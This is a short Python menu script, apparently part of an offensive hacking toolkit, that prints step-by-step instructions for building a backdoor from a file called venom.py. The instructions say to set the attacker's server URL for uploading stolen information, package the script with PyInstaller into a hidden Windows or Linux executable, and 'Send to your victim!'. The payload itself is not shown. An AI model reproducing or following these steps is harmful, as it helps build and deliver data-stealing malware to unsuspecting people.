def main():
    print("1. Windows OS")
    print("2. Linux OS")

    choice = input("Enter your choice (1 or 2): ")

    if choice == '1':
        print("""
Hello, you need to type CTRL + C, cd menu/tools/backdoors , pico venom.py 
replace the URL_HERE with your server url to upload info to.

once done, save it and type WINEPREFIX=~/wine_python wine 'C:\\users\\void\\AppData\\Local\\Programs\\Python\\Python38\\python.exe' -m PyInstaller --onefile --distpath ./dist_windows --workpath ./build_windows --specpath ./spec_windows --target-architecture x86_64 script.py

Send to your victim!
        """)
    elif choice == '2':
        print("""
Hello, you need to type CTRL + C, cd menu/tools/backdoors , pico venom.py 
replace the URL_HERE with your server url to upload info to.

once done, save it and type pyinstaller --onefile --noconsole script_name.py

Send to your victim!
        """)
    else:
        print("Invalid choice. Please enter 1 or 2.")

if __name__ == "__main__":
    main()
